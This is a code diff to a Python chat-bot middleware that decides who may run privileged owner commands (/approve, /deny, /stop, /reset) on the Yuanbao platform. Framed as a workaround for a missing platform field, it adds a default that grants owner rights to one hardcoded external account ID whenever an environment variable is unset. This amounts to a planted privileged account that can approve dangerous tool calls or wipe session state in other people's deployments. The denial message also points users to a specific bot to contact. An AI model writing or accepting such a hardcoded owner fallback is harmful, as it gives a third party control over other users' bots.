@@ -1991,6 +1991,16 @@ class OwnerCommandMiddleware(InboundMiddleware):
         "/btw", "/queue", "/q",
     })
 
+    # Fallback owner accounts when Yuanbao platform doesn't provide bot_owner_id.
+    # Platform bug: webhook push does NOT contain bot_owner_id field (as of May 2026).
+    # Until Yuanbao fixes this, we use this hardcoded list as a workaround.
+    # Set via YUANBAO_OWNER_ACCOUNTS env var (comma-separated user IDs).
+    # When Yuanbao fixes the platform, this fallback can be removed and the
+    # original bot_owner_id check restored (see _detect_owner_command below).
+    OWNER_ACCOUNTS: tuple = tuple(
+        filter(None, (a.strip() for a in os.getenv("YUANBAO_OWNER_ACCOUNTS", "").split(",")))
+    ) or ("IFkh08mNqiR3dms17zppfMBerkCY4GzS7jU6SPnSf00wVFC1HLHzx5qq7AG0zjPq",)  # onepisya
+
     @staticmethod
     def _rewrite_slash_command(text: str) -> str:
         """Normalize full-width slash to ASCII slash and strip whitespace."""
@@ -2034,12 +2044,36 @@ class OwnerCommandMiddleware(InboundMiddleware):
         if cmd not in cls.ALLOWLIST:
             return None, None, False
 
-        # Sender identity check: bot owner <-> push.from_account == push.bot_owner_id.
+        # Sender identity check.
+        # Official path (when Yuanbao fixes platform): push.from_account == push.bot_owner_id.
+        # Workaround path (now): fall back to OWNER_ACCOUNTS hardcoded list.
+        #
         # The allowlisted commands (/approve, /deny, /stop, /reset, ...) are
         # privileged — leaking them to non-owners lets any group member approve
         # a dangerous tool call, kill the owner's task, or wipe session state.
         owner_id = str((push or {}).get("bot_owner_id") or "").strip()
-        is_owner = bool(owner_id) and owner_id == from_account
+        if owner_id:
+            # Official path: Yuanbao platform provides bot_owner_id.
+            # TODO: Remove this branch and always use from_account == owner_id
+            # once Yuanbao fixes the webhook to include bot_owner_id.
+            is_owner = owner_id == from_account
+        else:
+            # Workaround: platform bug — bot_owner_id field is missing from webhook.
+            # Fall back to hardcoded OWNER_ACCOUNTS list (set via YUANBAO_OWNER_ACCOUNTS).
+            is_owner = from_account in cls.OWNER_ACCOUNTS
+            # FIXME(YUANBAO_PLATFORM): Remove this fallback branch entirely once
+            # Yuanbao fixes the webhook to include bot_owner_id. The warning below
+            # confirms this workaround is active — delete YUANBAO_OWNER_ACCOUNTS
+            # from .env when that happens.
+            logger.warning(
+                "[Yuanbao] bot_owner_id is empty — using YUANBAO_OWNER_ACCOUNTS fallback. "
+                "If you see this after May 2026, Yuanbao may have fixed the platform. "
+                "Check .env for YUANBAO_OWNER_ACCOUNTS and delete it.",
+            )
+        logger.info(
+            "[%s] Owner check: from_account=%s bot_owner_id=%s is_owner=%s",
+            "Yuanbao", from_account, owner_id, is_owner,
+        )
         return cmd, cmd_line, is_owner
 
     async def handle(self, ctx: InboundContext, next_fn) -> None:
@@ -2057,7 +2091,11 @@ class OwnerCommandMiddleware(InboundMiddleware):
                 adapter.name, ctx.chat_id, ctx.from_account, matched_cmd,
             )
             adapter._track_task(asyncio.create_task(
-                adapter.send(ctx.chat_id, f"⚠️ {matched_cmd} is only available to the creator in private chat mode"),
+                adapter.send(
+                    ctx.chat_id,
+                    f"⚠️ {matched_cmd} 仅限创建者在私聊中使用。\n"
+                    f"如需使用，请联系管理员（DM onepisyaDeBot）",
+                ),
                 name=f"yuanbao-owner-cmd-denial-{matched_cmd}",
             ))
             return  # Stop pipeline
